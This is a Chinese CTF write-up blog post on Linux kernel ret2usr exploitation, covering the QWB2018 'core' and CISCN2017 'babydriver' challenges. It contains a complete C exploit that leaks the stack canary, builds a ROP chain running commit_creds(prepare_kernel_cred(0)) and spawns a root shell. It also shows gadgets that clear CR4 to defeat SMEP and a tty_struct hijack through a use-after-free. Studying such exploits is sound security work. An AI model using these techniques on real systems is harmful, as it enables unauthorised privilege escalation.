---
layout: post
title:  "Kernel ret2usr"
date:   2020-3-15
desc: ""
keywords: ""
categories: [Binary]
tags: []
icon: icon-html
---

# Kernel ret2usr

继续ROP

上一篇rop执行的commit_creds(prepare_kernel_cred(0))是在内核空间

获取commit_creds和prepare_kernel_cred地址后，利用函数指针在用户空间构造一个commit_creds(prepare_kernel_cred(0))很方便，⑧用再找一坨gadget，ret2usr就是返回到用户空间的commit_creds(prepare_kernel_cred(0))

ROP链

1. ROP执行用户空间的commit_creds(prepare_kernel_cred(0))
2. 返回到用户态执行system("/bin/sh")

但是有个叫SMEP的东西，这玩意开了禁止内核执行用户空间的代码

那就直接给ret2usr🐏了🐎？

👴选择给SMEP🐏了

判断是否开启smep是根据CR4寄存器的第20位，保护开启值为1，关闭值为0

来个mov cr4, ?

就给他🐏了



## 强网杯2018-core

没开SMEP，不用🐏，直接打

拿到地址之后构造commit_creds(prepare_kernel_cred(0))

```c
void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}
```

在这个函数里放个`puts("[*]fucked!")`是龙鸣行为，直接崩

```c
// gcc exploit.c -static -masm=intel -g -o exploit
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void spawn_shell()
{
    if(!getuid())
    {
        system("/bin/sh");
    }
    else
    {
        puts("[*]spawn shell error!");
    }
    exit(0);
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;

size_t vmlinux_base = 0;
size_t find_symbols()
{
    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }

    char buf[0x30] = {0};
    while(fgets(buf, 0x30, kallsyms_fd))
    {
        if(commit_creds & prepare_kernel_cred)
            return 0;

        if(strstr(buf, "commit_creds") && !commit_creds)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds addr: %p\n", commit_creds);
            vmlinux_base = commit_creds - 0x9c8e0;
            printf("vmlinux_base addr: %p\n", vmlinux_base);
        }

        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
        {
            char hex[20] = {0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
            vmlinux_base = prepare_kernel_cred - 0x9cce0;
        }
    }

    if(!(prepare_kernel_cred & commit_creds))
    {
        puts("[*]Error!");
        exit(0);
    }

}

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void set_off(int fd, long long idx)
{
    printf("[*]set off to %ld\n", idx);
    ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd, char *buf)
{
    puts("[*]read to buf.");
    ioctl(fd, 0x6677889B, buf);

}

void core_copy_func(int fd, long long size)
{
    printf("[*]copy from user with size: %ld\n", size);
    ioctl(fd, 0x6677889A, size);
}

int main()
{
    save_status();
    int fd = open("/proc/core", 2);
    if(fd < 0)
    {
        puts("[*]open /proc/core error!");
        exit(0);
    }

    find_symbols();
    ssize_t offset = vmlinux_base - raw_vmlinux_base;

    set_off(fd, 0x40);

    char buf[0x40] = {0};
    core_read(fd, buf);
    size_t canary = ((size_t *)buf)[0];
    printf("[+]canary: %p\n", canary);

    size_t rop[0x1000] = {0};

    int i;
    for(i = 0; i < 10; i++)
    {
        rop[i] = canary;
    }

    rop[i++] = (size_t)get_root;            // root
    rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
    rop[i++] = 0;
    rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; 

    rop[i++] = (size_t)spawn_shell;         // rip 

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x800);
    core_copy_func(fd, 0xffffffffffff0100);
    return 0;
}
```



## CISCN2017 babydriver

开了smep，找俩gadget🐏了

```c
    rop[i++] = 0xffffffff810d238d;      // pop rdi; ret;
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;      // mov cr4, rdi; pop rbp; ret;
```

函数地址白给

```c
/ $ grep prepare_kernel_cred /proc/kallsyms
ffffffff810a1810 T prepare_kernel_cred
ffffffff81d91890 R __ksymtab_prepare_kernel_cred
ffffffff81dac968 r __kcrctab_prepare_kernel_cred
ffffffff81db9450 r __kstrtab_prepare_kernel_cred
/ $ grep commit_creds /proc/kallsyms
ffffffff810a1420 T commit_creds
ffffffff81d88f60 R __ksymtab_commit_creds
ffffffff81da84d0 r __kcrctab_commit_creds
ffffffff81db948c r __kstrtab_commit_creds
```

利用uaf控制`tty_struct`结构体，大小为0x2e0，可以通过打开/dev/ptmx得到

```c
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;
	/* Protects ldisc changes: Lock tty not pty */
	struct ld_semaphore ldisc_sem;
	struct tty_ldisc *ldisc;
	struct mutex atomic_write_lock;
	struct mutex legacy_mutex;
	struct mutex throttle_mutex;
	struct rw_semaphore termios_rwsem;
	struct mutex winsize_mutex;
	spinlock_t ctrl_lock;
	spinlock_t flow_lock;
	/* Termios values are protected by the termios rwsem */
	struct ktermios termios, termios_locked;
	struct termiox *termiox;	/* May be NULL for unsupported */
	char name[64];
	struct pid *pgrp;		/* Protected by ctrl lock */
	struct pid *session;
	unsigned long flags;
	int count;
	struct winsize winsize;		/* winsize_mutex */
	unsigned long stopped:1,	/* flow_lock */
		      flow_stopped:1,
		      unused:BITS_PER_LONG - 2;
	int hw_stopped;
	unsigned long ctrl_status:8,	/* ctrl_lock */
		      packet:1,
		      unused_ctrl:BITS_PER_LONG - 9;
	unsigned int receive_room;	/* Bytes free for queue */
	int flow_change;
	struct tty_struct *link;
	struct fasync_struct *fasync;
	wait_queue_head_t write_wait;
	wait_queue_head_t read_wait;
	struct work_struct hangup_work;
	void *disc_data;
	void *driver_data;
	spinlock_t files_lock;		/* protects tty_files list */
	struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
	int closing;
	unsigned char *write_buf;
	int write_cnt;
	/* If the tty has a pending do_SAK, queue it here - akpm */
	struct work_struct SAK_work;
	struct tty_port *port;
} __randomize_layout;
```

`tty_struct`中的`tty_operations`

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
	int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
	int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
	void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
	int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

在`tty_struct`中把`tty_operations`劫持到`fake_tty_operations`，利用函数指针控制执行

